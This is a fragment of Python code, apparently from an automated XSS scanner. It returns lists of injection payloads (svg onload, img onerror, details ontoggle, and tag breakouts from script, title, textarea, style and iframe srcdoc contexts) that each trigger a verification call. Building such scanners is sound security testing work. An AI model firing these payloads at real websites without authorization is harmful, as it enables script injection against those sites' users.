                # Execute inside the iframe (srcdoc content = HTML)
                f"<script>{verify_call}</script>",
                f"<svg/onload={verify_call}>",
                f"<img src=x onerror={verify_call}>",
                f"<details open ontoggle={verify_call}>",
                # Break out of srcdoc into the parent document
                f'"><svg/onload={verify_call}>',
                f"'><svg/onload={verify_call}>",
                f'"><script>{verify_call}</script>',
                f'"><img src=x onerror={verify_call}>',
                f'" onload="javascript:{verify_call}" x="',
            ]

        # Generic polyglot fallbacks
        return [
            # --- original ---
            f"<svg/onload={verify_call}>",
            f'"><svg/onload={verify_call}>',
            f"'-{verify_call}-'",
            f"javascript:{verify_call}",
            # --- added ---
            f"'><svg/onload={verify_call}>",
            f"--><svg/onload={verify_call}>",
            f"</script><svg/onload={verify_call}>",
            f"</title><svg/onload={verify_call}>",
            f"</textarea><svg/onload={verify_call}>",
            f"</style><svg/onload={verify_call}>",
            f"<img src=x onerror={verify_call}>",
            f"<script>{verify_call}</script>",
            f";{verify_call};//",
        ]
    